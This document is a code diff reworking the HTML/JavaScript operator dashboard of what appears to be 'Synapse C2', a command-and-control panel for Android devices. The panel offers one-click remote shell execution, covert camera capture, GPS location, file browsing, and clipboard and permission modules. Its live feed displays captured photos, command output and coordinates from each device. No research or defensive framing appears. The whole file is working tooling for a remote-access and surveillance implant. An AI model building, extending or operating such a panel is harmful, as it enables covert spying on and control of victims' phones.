@@ -6,285 +6,549 @@
     <title>Synapse C2 — Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0d1117;
+            --bg2: #161b22;
+            --bg3: #21262d;
+            --border: #30363d;
+            --text: #c9d1d9;
+            --dim: #8b949e;
+            --accent: #58a6ff;
+            --green: #3fb950;
+            --red: #f85149;
+            --code-green: #7ee787;
+        }
         body {
-            font-family: 'Segoe UI', 'Fira Code', monospace;
-            background: #0d1117;
-            color: #c9d1d9;
-            min-height: 100vh;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            height: 100vh;
+            overflow: hidden;
         }
         .header {
-            background: #161b22;
-            border-bottom: 1px solid #30363d;
-            padding: 16px 24px;
+            background: var(--bg2);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 20px;
             display: flex;
             align-items: center;
             gap: 12px;
+            height: 48px;
         }
-        .header h1 {
-            font-size: 20px;
-            color: #58a6ff;
-            font-weight: 600;
-        }
-        .header .status {
-            font-size: 12px;
-            color: #8b949e;
-            margin-left: auto;
-        }
-        .header .dot {
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 6px;
-        }
-        .dot.online { background: #3fb950; box-shadow: 0 0 8px #3fb950; }
-        .dot.offline { background: #f85149; }
-        .container {
-            display: grid;
-            grid-template-columns: 320px 1fr;
-            height: calc(100vh - 57px);
-            gap: 0;
-        }
+        .header h1 { font-size: 18px; color: var(--accent); font-weight: 700; }
+        .header .server-status { margin-left: auto; font-size: 12px; color: var(--dim); display: flex; align-items: center; gap: 6px; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+        .dot.green { background: var(--green); box-shadow: 0 0 8px var(--green); }
+        .dot.red { background: var(--red); }
+
+        .container { display: grid; grid-template-columns: 300px 1fr; height: calc(100vh - 48px); }
         .sidebar {
-            background: #161b22;
-            border-right: 1px solid #30363d;
-            padding: 16px;
+            background: var(--bg2);
+            border-right: 1px solid var(--border);
             overflow-y: auto;
-        }
-        .sidebar h3 {
-            font-size: 14px;
-            color: #8b949e;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 12px;
-        }
-        .device-card {
-            background: #21262d;
-            border: 1px solid #30363d;
-            border-radius: 6px;
             padding: 12px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: border-color 0.2s;
-        }
-        .device-card:hover { border-color: #58a6ff; }
-        .device-card.selected { border-color: #58a6ff; background: #1c2838; }
-        .device-card .id {
-            font-size: 13px;
-            font-weight: 600;
-            color: #58a6ff;
-            word-break: break-all;
-        }
-        .device-card .info {
-            font-size: 11px;
-            color: #8b949e;
-            margin-top: 4px;
-        }
-        .device-card .status-dot {
-            display: inline-block;
-            width: 7px; height: 7px;
-            border-radius: 50%;
-            margin-right: 6px;
-        }
-        .main {
-            padding: 16px 24px;
             display: flex;
             flex-direction: column;
-            gap: 16px;
+            gap: 8px;
         }
-        .panel {
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 8px;
-            padding: 16px;
-        }
-        .panel h3 {
-            font-size: 14px;
-            color: #8b949e;
+        .sidebar h3 {
+            font-size: 11px;
+            color: var(--dim);
             text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 12px;
+            letter-spacing: 1.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
+        .sidebar h3 .count { color: var(--accent); }
+        .device-card {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 10px 12px;
+            cursor: pointer;
+            transition: all 0.15s;
+            position: relative;
+        }
+        .device-card:hover { border-color: var(--accent); }
+        .device-card.selected { border-color: var(--accent); background: #1c2838; box-shadow: 0 0 12px rgba(88,166,255,0.15); }
+        .device-card .id-line { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
+        .device-card .id-line .dev-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+        .device-card .dev-id {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--accent);
+            word-break: break-all;
+            font-family: 'Fira Code', 'Cascadia Code', monospace;
+        }
+        .device-card .dev-info { font-size: 10px; color: var(--dim); line-height: 1.5; }
+        .device-card .dev-info span { color: var(--text); }
+
+        .main { display: flex; flex-direction: column; overflow: hidden; }
+        .cmd-panel {
+            background: var(--bg2);
+            border-bottom: 1px solid var(--border);
+            padding: 14px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .quick-actions { display: flex; gap: 6px; flex-wrap: wrap; }
+        .qbtn {
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            background: var(--bg3);
+            color: var(--text);
+            transition: all 0.15s;
+            white-space: nowrap;
+        }
+        .qbtn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .qbtn:disabled { opacity: 0.4; cursor: not-allowed; pointer-events: none; }
+        .qbtn.ping { border-color: #3fb950; color: #3fb950; }
+        .qbtn.ping:hover { background: #3fb950; color: #000; }
+        .qbtn.shell { border-color: #f0883e; color: #f0883e; }
+        .qbtn.shell:hover { background: #f0883e; color: #000; }
+        .qbtn.camera { border-color: #db61a2; color: #db61a2; }
+        .qbtn.camera:hover { background: #db61a2; color: #000; }
         .cmd-row {
             display: flex;
             gap: 8px;
-            margin-bottom: 8px;
+            align-items: center;
         }
         .cmd-row input, .cmd-row select {
-            background: #0d1117;
-            border: 1px solid #30363d;
+            background: var(--bg);
+            border: 1px solid var(--border);
             border-radius: 4px;
-            color: #c9d1d9;
-            padding: 8px 12px;
+            color: var(--text);
+            padding: 7px 10px;
             font-family: 'Fira Code', monospace;
-            font-size: 13px;
+            font-size: 12px;
             outline: none;
         }
-        .cmd-row input:focus, .cmd-row select:focus { border-color: #58a6ff; }
+        .cmd-row input:focus, .cmd-row select:focus { border-color: var(--accent); }
         .cmd-row input { flex: 1; }
-        .cmd-row select { min-width: 160px; }
-        .btn {
+        .cmd-row .mod-input { max-width: 140px; }
+        .cmd-row .act-input { max-width: 140px; }
+        .send-btn {
             background: #238636;
             border: 1px solid #2ea043;
             border-radius: 4px;
             color: #fff;
-            padding: 8px 20px;
+            padding: 8px 24px;
             font-size: 13px;
-            cursor: pointer;
             font-weight: 600;
+            cursor: pointer;
             transition: background 0.15s;
         }
-        .btn:hover { background: #2ea043; }
-        .btn:disabled { background: #21262d; border-color: #30363d; color: #484f58; cursor: not-allowed; }
-        .result-viewer {
-            height: 350px;
+        .send-btn:hover { background: #2ea043; }
+        .send-btn:disabled { background: var(--bg3); border-color: var(--border); color: #484f58; cursor: not-allowed; }
+        .send-btn.loading { opacity: 0.7; }
+        .spinner {
+            display: none;
+            width: 14px; height: 14px;
+            border: 2px solid transparent;
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .send-btn.loading .spinner { display: inline-block; }
+        .send-btn.loading .btn-text { display: none; }
+
+        .result-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .result-tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); }
+        .result-tabs button {
+            padding: 8px 16px;
+            background: transparent;
+            border: none;
+            color: var(--dim);
+            cursor: pointer;
+            font-size: 12px;
+            border-bottom: 2px solid transparent;
+            transition: all 0.15s;
+        }
+        .result-tabs button.active { color: var(--accent); border-bottom-color: var(--accent); }
+        .result-tabs button:hover { color: var(--text); }
+
+        .tab-content { flex: 1; overflow: hidden; display: none; flex-direction: column; }
+        .tab-content.active { display: flex; }
+
+        .result-feed {
+            flex: 1;
             overflow-y: auto;
+            padding: 12px;
             font-family: 'Fira Code', monospace;
             font-size: 12px;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 4px;
-            padding: 12px;
+            background: var(--bg);
         }
         .result-entry {
-            padding: 8px;
-            border-bottom: 1px solid #21262d;
-            line-height: 1.5;
+            padding: 8px 12px;
+            border-left: 2px solid var(--border);
+            margin-bottom: 8px;
         }
-        .result-entry:last-child { border-bottom: none; }
+        .result-entry:hover { border-left-color: var(--accent); }
         .result-meta {
-            color: #8b949e;
-            font-size: 11px;
+            font-size: 10px;
+            color: var(--dim);
             margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
         }
-        .result-data {
-            color: #7ee787;
+        .result-meta .module-tag {
+            background: var(--bg3);
+            padding: 1px 6px;
+            border-radius: 3px;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .result-meta .module-tag.camera { color: #db61a2; }
+        .result-meta .module-tag.files { color: #f0883e; }
+        .result-meta .module-tag.shell { color: #7ee787; }
+        .result-meta .module-tag.info { color: #58a6ff; }
+        .result-payload {
+            color: var(--code-green);
             white-space: pre-wrap;
             word-break: break-word;
+            max-height: 300px;
+            overflow-y: auto;
+            line-height: 1.5;
         }
+        .result-image {
+            max-width: 100%;
+            max-height: 400px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            cursor: pointer;
+            display: block;
+            margin-top: 6px;
+        }
+        .result-image:hover { border-color: var(--accent); }
+
+        /* Device info card */
+        .info-card {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 6px;
+        }
+        .info-card .info-row {
+            display: flex;
+            padding: 4px 0;
+            font-size: 12px;
+        }
+        .info-card .info-label {
+            color: var(--dim);
+            width: 120px;
+            flex-shrink: 0;
+            font-weight: 600;
+        }
+        .info-card .info-value {
+            color: var(--text);
+            word-break: break-all;
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+        }
+
+        /* Ping success */
+        .ping-ok {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 12px;
+            background: rgba(63,185,80,0.1);
+            border: 1px solid var(--green);
+            border-radius: 4px;
+            color: var(--green);
+            font-weight: 600;
+            margin-top: 6px;
+        }
+        .ping-ok .check-icon { font-size: 18px; }
+
+        /* Shell output */
+        .shell-output {
+            background: #0a0f16;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px 12px;
+            margin-top: 6px;
+            font-family: 'Fira Code', 'Cascadia Code', monospace;
+            font-size: 11px;
+            color: var(--code-green);
+            white-space: pre-wrap;
+            word-break: break-word;
+            max-height: 300px;
+            overflow-y: auto;
+            line-height: 1.5;
+        }
+        .shell-output .exit-code {
+            font-size: 10px;
+            color: var(--dim);
+            margin-top: 4px;
+            padding-top: 4px;
+            border-top: 1px solid var(--border);
+        }
+        .shell-output .exit-code.nonzero { color: var(--red); }
+
+        /* Error display */
+        .error-block {
+            background: rgba(248,81,73,0.08);
+            border: 1px solid var(--red);
+            border-radius: 4px;
+            padding: 8px 12px;
+            margin-top: 6px;
+            color: var(--red);
+            font-size: 12px;
+            font-family: 'Fira Code', monospace;
+            word-break: break-word;
+        }
+
+        /* Location display */
+        .location-display {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        .location-display .coords {
+            color: var(--accent);
+            font-family: 'Fira Code', monospace;
+        }
+
+        .file-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+        .file-table th {
+            text-align: left;
+            padding: 6px 8px;
+            border-bottom: 1px solid var(--border);
+            color: var(--dim);
+            font-weight: 600;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .file-table td {
+            padding: 6px 8px;
+            border-bottom: 1px solid #21262d;
+        }
+        .file-table tr:hover td { background: var(--bg3); }
+        .file-dl {
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            padding: 3px 10px;
+            border-radius: 3px;
+            font-size: 11px;
+            cursor: pointer;
+        }
+        .file-dl:hover { background: #79b8ff; }
+
         .empty-state {
             color: #484f58;
             text-align: center;
             padding: 60px 20px;
+            font-size: 13px;
         }
-        .stats {
+        .empty-state .icon { font-size: 32px; margin-bottom: 8px; }
+
+        .stats-row {
             display: flex;
-            gap: 16px;
-            margin-bottom: 12px;
+            gap: 12px;
+            padding: 10px 20px;
+            background: var(--bg2);
+            border-bottom: 1px solid var(--border);
         }
         .stat {
-            background: #21262d;
-            padding: 8px 16px;
-            border-radius: 6px;
-            border: 1px solid #30363d;
+            background: var(--bg3);
+            padding: 6px 14px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
         }
-        .stat .num { font-size: 24px; font-weight: 700; color: #58a6ff; }
-        .stat .label { font-size: 11px; color: #8b949e; text-transform: uppercase; }
+        .stat .num { font-weight: 700; color: var(--accent); font-size: 16px; }
+        .stat .label { color: var(--dim); font-size: 10px; text-transform: uppercase; }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--bg3);
+            border: 1px solid var(--accent);
+            color: var(--text);
+            padding: 10px 18px;
+            border-radius: 6px;
+            font-size: 12px;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            max-width: 400px;
+        }
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        /* Modal for full-size image */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 999; justify-content: center; align-items: center; cursor: pointer; }
+        .modal.show { display: flex; }
+        .modal img { max-width: 95%; max-height: 95%; border-radius: 8px; }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>⚡ Synapse C2</h1>
-        <span class="status"><span class="dot online"></span> Server Online</span>
+        <span class="server-status"><span class="dot green" id="sse-dot"></span> <span id="sse-status">Connecting...</span></span>
     </div>
     <div class="container">
         <div class="sidebar" id="sidebar">
-            <h3>📱 Devices <span id="device-count">(0)</span></h3>
-            <div id="device-list">
-                <div class="empty-state">No devices connected</div>
-            </div>
+            <h3>📱 Devices <span class="count" id="device-count">(0)</span></h3>
+            <div id="device-list"><div class="empty-state">No devices connected</div></div>
         </div>
         <div class="main">
-            <div class="panel">
-                <div class="stats">
-                    <div class="stat"><div class="num" id="total-devices">0</div><div class="label">Total</div></div>
-                    <div class="stat"><div class="num" id="online-devices">0</div><div class="label">Online</div></div>
-                    <div class="stat"><div class="num" id="offline-devices">0</div><div class="label">Offline</div></div>
+            <div class="stats-row">
+                <div class="stat"><div class="num" id="total-devices">0</div><div class="label">Total</div></div>
+                <div class="stat"><div class="num" id="online-devices">0</div><div class="label">Online</div></div>
+                <div class="stat"><div class="num" id="offline-devices">0</div><div class="label">Offline</div></div>
+                <div class="stat"><div class="num" id="result-count">0</div><div class="label">Results</div></div>
+            </div>
+
+            <div class="cmd-panel">
+                <div class="quick-actions">
+                    <button class="qbtn ping" disabled id="qb-ping" onclick="quickAction('ping','ping')">🏓 Ping</button>
+                    <button class="qbtn" disabled id="qb-info" onclick="quickAction('info','gather')">📋 Device Info</button>
+                    <button class="qbtn shell" disabled id="qb-shell" onclick="quickShell()">💻 Shell</button>
+                    <button class="qbtn" disabled id="qb-files" onclick="quickAction('files','list')">📁 Files</button>
+                    <button class="qbtn" disabled id="qb-location" onclick="quickAction('location','get')">📍 Location</button>
+                    <button class="qbtn camera" disabled id="qb-camera" onclick="quickAction('camera','capture')">📸 Camera</button>
+                </div>
+                <div class="cmd-row">
+                    <input type="text" class="mod-input" id="cmd-module" placeholder="module">
+                    <input type="text" class="act-input" id="cmd-action" placeholder="action">
+                    <input type="text" id="cmd-params" placeholder='params (JSON, e.g. {"cmd":"id"})'>
+                    <button class="send-btn" id="send-btn" disabled onclick="sendCommand()">
+                        <span class="btn-text">▶ Send</span>
+                        <span class="spinner"></span>
+                    </button>
                 </div>
             </div>
-            <div class="panel">
-                <h3>💻 Command Console</h3>
-                <div class="cmd-row">
-                    <select id="cmd-device">
-                        <option value="">-- Select Device --</option>
-                    </select>
+
+            <div class="result-area">
+                <div class="result-tabs">
+                    <button class="active" onclick="switchTab('feed')" id="tab-feed">📡 Live Feed</button>
+                    <button onclick="switchTab('camera')" id="tab-camera">📸 Camera</button>
+                    <button onclick="switchTab('files')" id="tab-files">📁 File Browser</button>
                 </div>
-                <div class="cmd-row">
-                    <input type="text" id="cmd-module" placeholder="Module (e.g., shell, files, camera)">
-                    <input type="text" id="cmd-action" placeholder="Action (e.g., exec, list, capture)">
+                <div class="tab-content active" id="content-feed">
+                    <div class="result-feed" id="result-feed">
+                        <div class="empty-state"><div class="icon">📡</div>Awaiting results via SSE...</div>
+                    </div>
                 </div>
-                <div class="cmd-row">
-                    <input type="text" id="cmd-params" placeholder="Params (JSON, e.g., {&quot;cmd&quot;:&quot;id&quot;})">
-                    <button class="btn" id="send-btn" disabled onclick="sendCommand()">▶ Send Command</button>
+                <div class="tab-content" id="content-camera">
+                    <div class="result-feed" id="camera-feed">
+                        <div class="empty-state"><div class="icon">📸</div>No camera captures yet</div>
+                    </div>
                 </div>
-            </div>
-            <div class="panel" style="flex:1;">
-                <h3>📋 Results</h3>
-                <div class="result-viewer" id="result-viewer">
-                    <div class="empty-state">Awaiting results...</div>
+                <div class="tab-content" id="content-files">
+                    <div class="result-feed" id="files-feed">
+                        <div class="empty-state"><div class="icon">📁</div>No file listings yet — send a "files" "list" command</div>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
+    <!-- Image modal -->
+    <div class="modal" id="image-modal" onclick="closeModal()">
+        <img id="modal-img" src="" alt="Full size">
+    </div>
+
     <script>
-        let selectedDevice = '';
-        let devices = {};
-
         const API = window.location.origin;
+        let selectedDevice = null;
+        let devices = {};
+        let resultCount = 0;
+        let sseConnected = false;
 
-        // Poll devices every 2 seconds
+        // ── Device polling ──────────────────────────────────────────
         async function pollDevices() {
             try {
                 const res = await fetch(API + '/api/devices');
                 const data = await res.json();
-                devices = {};
-                data.devices.forEach(d => { devices[d.id] = d; });
-                renderDevices(data.devices);
-                updateStats(data.devices);
+                const list = data.devices || [];
+                const devMap = {};
+                list.forEach(d => { devMap[d.id] = d; });
+                devices = devMap;
+                renderDevices(list);
+                updateStats(list);
             } catch(e) {
                 console.error('Poll error:', e);
+                document.getElementById('sse-dot').className = 'dot red';
             }
         }
 
         function renderDevices(list) {
             const container = document.getElementById('device-list');
-            const select = document.getElementById('cmd-device');
             const countSpan = document.getElementById('device-count');
-
             countSpan.textContent = '(' + list.length + ')';
 
             if (list.length === 0) {
                 container.innerHTML = '<div class="empty-state">No devices connected</div>';
-                select.innerHTML = '<option value="">-- Select Device --</option>';
+                setQuickButtonsEnabled(false);
+                document.getElementById('send-btn').disabled = true;
                 return;
             }
 
             container.innerHTML = '';
-            select.innerHTML = '<option value="">-- Select Device --</option>';
+            list.sort((a,b) => (b.online ? 1 : 0) - (a.online ? 1 : 0));
 
             list.forEach(dev => {
-                // Sidebar card
                 const card = document.createElement('div');
-                card.className = 'device-card' + (dev.id === selectedDevice ? ' selected' : '');
+                card.className = 'device-card' + (selectedDevice === dev.id ? ' selected' : '');
                 card.onclick = () => selectDevice(dev.id);
                 card.innerHTML = `
-                    <span class="status-dot ${dev.online ? 'online' : 'offline'}" 
-                          style="background:${dev.online ? '#3fb950' : '#f85149'};box-shadow:${dev.online ? '0 0 8px #3fb950' : 'none'};"></span>
-                    <div class="id">${escapeHtml(dev.id)}</div>
-                    <div class="info">
-                        ${dev.info.model || 'Unknown'} | ${dev.info.os_version || '?'} | ${dev.online ? '🟢 Online' : '🔴 Offline'}
-                        ${dev.has_fcm ? ' | 📲 FCM' : ''}
+                    <div class="id-line">
+                        <div class="dev-dot" style="background:${dev.online ? '#3fb950' : '#f85149'};box-shadow:${dev.online ? '0 0 8px #3fb950' : 'none'};"></div>
+                        <div class="dev-id">${esc(dev.id.substring(0,16))}...</div>
+                    </div>
+                    <div class="dev-info">
+                        <span>${esc(dev.info?.model || 'Unknown')}</span> · 
+                        Android <span>${esc(dev.info?.os_version || '?')}</span> · 
+                        <span>${esc(dev.info?.arch || '?')}</span><br>
+                        ${dev.online ? '🟢 Online' : '🔴 Offline'} · 
+                        ${fmtTime(dev.last_seen)}
+                        ${dev.has_fcm ? ' · 📲 FCM' : ''}
                     </div>
                 `;
                 container.appendChild(card);
-
-                // Dropdown option
-                const opt = document.createElement('option');
-                opt.value = dev.id;
-                opt.textContent = dev.id + (dev.online ? ' [Online]' : ' [Offline]');
-                if (dev.id === selectedDevice) opt.selected = true;
-                select.appendChild(opt);
             });
+
+            // Auto-select first online device if none selected
+            if (!selectedDevice || !devices[selectedDevice]) {
+                const firstOnline = list.find(d => d.online);
+                if (firstOnline) selectDevice(firstOnline.id);
+            }
+
+            setQuickButtonsEnabled(selectedDevice && devices[selectedDevice]?.online);
+            document.getElementById('send-btn').disabled = !(selectedDevice && devices[selectedDevice]?.online);
         }
 
         function updateStats(list) {
@@ -293,120 +557,501 @@
             document.getElementById('total-devices').textContent = total;
             document.getElementById('online-devices').textContent = online;
             document.getElementById('offline-devices').textContent = total - online;
+            document.getElementById('result-count').textContent = resultCount;
         }
 
         function selectDevice(id) {
             selectedDevice = id;
-            document.getElementById('cmd-device').value = id;
-            document.getElementById('send-btn').disabled = !id;
-            // Re-render to update selection highlights
-            Object.values(devices).forEach(d => {
-                // Simple re-render
-            });
-            pollDevices();
+            const dev = devices[id];
+            setQuickButtonsEnabled(dev?.online || false);
+            document.getElementById('send-btn').disabled = !(dev?.online);
+            pollDevices(); // re-render selection
         }
 
-        // Listen for device dropdown changes
-        document.getElementById('cmd-device').addEventListener('change', function() {
-            selectedDevice = this.value;
-            document.getElementById('send-btn').disabled = !selectedDevice;
-        });
+        function setQuickButtonsEnabled(on) {
+            document.querySelectorAll('.qbtn').forEach(b => b.disabled = !on);
+        }
 
+        // ── Command sending ─────────────────────────────────────────
         async function sendCommand() {
-            const deviceId = document.getElementById('cmd-device').value;
+            const dev = devices[selectedDevice];
+            if (!dev || !dev.online) {
+                toast('Device is offline');
+                return;
+            }
             const module = document.getElementById('cmd-module').value.trim();
             const action = document.getElementById('cmd-action').value.trim();
             const paramsStr = document.getElementById('cmd-params').value.trim();
 
-            if (!deviceId || !module || !action) {
-                alert('Please fill in device, module, and action.');
+            if (!module || !action) {
+                toast('Module and action are required');
                 return;
             }
 
             let params = {};
             if (paramsStr) {
                 try { params = JSON.parse(paramsStr); }
-                catch(e) { alert('Invalid JSON params: ' + e.message); return; }
+                catch(e) { toast('Invalid JSON: ' + e.message); return; }
             }
+
+            const btn = document.getElementById('send-btn');
+            btn.classList.add('loading');
+            btn.disabled = true;
 
             try {
                 const res = await fetch(API + '/api/command', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        device_id: deviceId,
-                        module: module,
-                        action: action,
-                        params: params
-                    })
+                    body: JSON.stringify({ device_id: selectedDevice, module, action, params })
                 });
                 const data = await res.json();
                 if (data.command_id) {
-                    addResult({
-                        device_id: deviceId,
-                        command_id: data.command_id,
-                        data: '[Command sent: ' + module + '/' + action + ']',
-                        time: new Date().toISOString()
-                    });
-                    // Clear params after send
                     document.getElementById('cmd-params').value = '';
+                    toast('Command sent: ' + module + '/' + action, 'success');
                 } else {
-                    alert('Error: ' + (data.error || 'Unknown'));
+                    toast('Error: ' + (data.error || 'Unknown'));
                 }
             } catch(e) {
-                alert('Send failed: ' + e.message);
+                toast('Send failed: ' + e.message);
+            } finally {
+                btn.classList.remove('loading');
+                btn.disabled = false;
             }
         }
 
-        // SSE for real-time results
+        function quickAction(module, action, params) {
+            document.getElementById('cmd-module').value = module;
+            document.getElementById('cmd-action').value = action;
+            document.getElementById('cmd-params').value = params ? JSON.stringify(params) : '';
+            sendCommand();
+        }
+
+        function quickShell() {
+            const cmd = prompt('Shell command to execute:', 'id');
+            if (!cmd) return;
+            quickAction('shell', 'exec', { cmd: cmd });
+        }
+
+        // ── SSE (Server-Sent Events) ────────────────────────────────
         function connectSSE() {
             const evtSource = new EventSource(API + '/api/events');
+            evtSource.onopen = function() {
+                sseConnected = true;
+                document.getElementById('sse-dot').className = 'dot green';
+                document.getElementById('sse-status').textContent = 'SSE Connected';
+            };
             evtSource.onmessage = function(event) {
                 try {
                     const result = JSON.parse(event.data);
-                    addResult(result);
-                } catch(e) {}
+                    handleResult(result);
+                } catch(e) { console.error('SSE parse:', e); }
             };
-            evtSource.onerror = function() {
-                // Reconnect after 3 seconds
+            evtSource.onerror = function(e) {
+                sseConnected = false;
+                document.getElementById('sse-dot').className = 'dot red';
+                document.getElementById('sse-status').textContent = 'SSE Disconnected (retrying...)';
+                evtSource.close();
                 setTimeout(connectSSE, 3000);
             };
         }
 
         let firstResult = true;
-        function addResult(result) {
-            const viewer = document.getElementById('result-viewer');
-            if (firstResult) { viewer.innerHTML = ''; firstResult = false; }
+        function handleResult(result) {
+            resultCount++;
+            document.getElementById('result-count').textContent = resultCount;
+
+            // Parse the data — it's a JSON envelope from the agent
+            let parsed = null;
+            let moduleName = result.module || '';
+            let actionName = result.action || '';
+
+            try {
+                parsed = JSON.parse(result.data);
+            } catch(e) { /* raw data, treat as plain text */ }
+
+            // Derive module/action from parsed envelope type if not provided
+            if (parsed && parsed.type && !moduleName) {
+                moduleName = inferModule(parsed.type);
+            }
+            // If still no module, try to derive from payload discriminator
+            if (!moduleName && parsed && parsed.payload && parsed.payload.type) {
+                moduleName = inferModule(parsed.payload.type);
+            }
+
+            const payload = parsed?.payload || null;
+            const envelopeType = (parsed?.type || '').toLowerCase();
+            const payloadType = (payload?.type || '').toLowerCase();
+
+            // Route to type-specific handlers
+            if (parsed?.status === 'error' || parsed?.error || envelopeType.includes('error') || payloadType.includes('error')) {
+                addErrorResult(result, parsed);
+            } else if (payload?.image_base64 || envelopeType.includes('camera') || payloadType === 'camera') {
+                // Camera — image_base64 from direct payload or nested
+                const b64 = payload?.image_base64 || '';
+                const fmt = payload?.format || 'jpeg';
+                const w = payload?.width || 0;
+                const h = payload?.height || 0;
+                const sz = payload?.size_bytes || 0;
+                if (b64) {
+                    addCameraResult(result, b64, fmt, w, h, sz);
+                } else {
+                    addGenericResult(result, parsed, moduleName, actionName);
+                }
+            } else if (payload?.pong !== undefined || envelopeType.includes('ping') || payloadType === 'ping') {
+                addPingResult(result, payload);
+            } else if (payload?.stdout !== undefined || envelopeType.includes('shell') || payloadType === 'shell') {
+                addShellResult(result, payload);
+            } else if (payload?.model !== undefined || payload?.fingerprint !== undefined || envelopeType.includes('device_info') || payloadType === 'device_info') {
+                addDeviceInfoResult(result, payload);
+            } else if (payload?.entries && Array.isArray(payload.entries)) {
+                addFileList(result.device_id, result.time, payload.entries);
+                addFileFeedResult(result, payload.entries, moduleName, actionName);
+            } else if (payload?.lat !== undefined || envelopeType.includes('location') || payloadType === 'location') {
+                addLocationResult(result, payload);
+            } else if (payload?.base64_data || payload?.mime_type) {
+                // File read result with base64 data
+                addGenericResult(result, parsed, moduleName, actionName);
+            } else {
+                // Generic: pretty-print JSON
+                addGenericResult(result, parsed, moduleName, actionName);
+            }
+        }
+
+        function inferModule(typeStr) {
+            const t = typeStr.toLowerCase();
+            if (t.includes('shell')) return 'shell';
+            if (t.includes('camera')) return 'camera';
+            if (t.includes('file')) return 'files';
+            if (t.includes('device') || t.includes('info')) return 'info';
+            if (t.includes('location')) return 'location';
+            if (t.includes('ping')) return 'ping';
+            if (t.includes('clipboard')) return 'clipboard';
+            if (t.includes('permission')) return 'permission';
+            if (t.includes('knox')) return 'knox';
+            if (t.includes('error')) return 'error';
+            return typeStr;
+        }
+
+        // ── Per-type result helpers ──────────────────────────────────
+
+        function addCameraResult(result, b64, fmt, width, height, sizeBytes) {
+            // Add to camera tab
+            addImageToCamera(result.device_id, result.time, b64, fmt, width, height, sizeBytes);
+
+            // Render in feed
+            const feed = document.getElementById('result-feed');
+            clearFirstResult(feed);
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${esc(result.device_id?.substring(0,14))}...
+                    <span class="module-tag camera">camera/capture</span>
+                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
+                    · ${fmtTime(result.time)}
+                    ${width > 0 ? `· ${width}×${height}` : ''}
+                    ${sizeBytes > 0 ? `· ${fmtSize(sizeBytes)}` : ''}
+                </div>
+                <img class="result-image" src="data:image/${(fmt||'jpeg').toLowerCase()};base64,${b64}"
+                    onclick="showModal(this.src)" alt="Camera capture" title="Click to enlarge">
+            `;
+            prependAndScroll(feed, entry);
+        }
+
+        function addPingResult(result, payload) {
+            const feed = document.getElementById('result-feed');
+            clearFirstResult(feed);
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            const latency = payload?.latency_ms;
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${esc(result.device_id?.substring(0,14))}...
+                    <span class="module-tag ping">ping/ping</span>
+                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
+                    · ${fmtTime(result.time)}
+                    ${latency !== undefined ? `· ${latency}ms` : ''}
+                </div>
+                <div class="ping-ok"><span class="check-icon">✅</span> Pong${latency !== undefined ? ' — ' + latency + 'ms' : ''}</div>
+            `;
+            prependAndScroll(feed, entry);
+        }
+
+        function addShellResult(result, payload) {
+            const feed = document.getElementById('result-feed');
+            clearFirstResult(feed);
+            const exitCode = payload?.exit_code;
+            const stdout = payload?.stdout || '';
+            const stderr = payload?.stderr || '';
